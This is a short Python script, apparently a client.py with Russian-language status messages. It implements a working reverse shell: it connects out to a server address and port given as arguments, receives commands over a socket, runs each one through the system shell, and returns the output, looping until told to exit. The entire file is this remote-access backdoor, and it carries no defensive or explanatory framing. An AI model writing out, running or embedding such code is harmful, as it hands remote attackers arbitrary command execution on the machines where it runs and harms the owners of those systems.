import socket
import subprocess
import sys
import os

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def connect_to_server(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        print(f"[*] Подключено к {host}:{port}")
        
        while True:
            command = client.recv(4096).decode()
            if not command:
                continue
            if command.lower() == 'exit':
                break
            
            output = execute_command(command)
            client.send(output.encode())
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: python client.py <SERVER_HOST> <SERVER_PORT>")
        sys.exit(1)
    
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])
    
    connect_to_server(SERVER_HOST, SERVER_PORT)
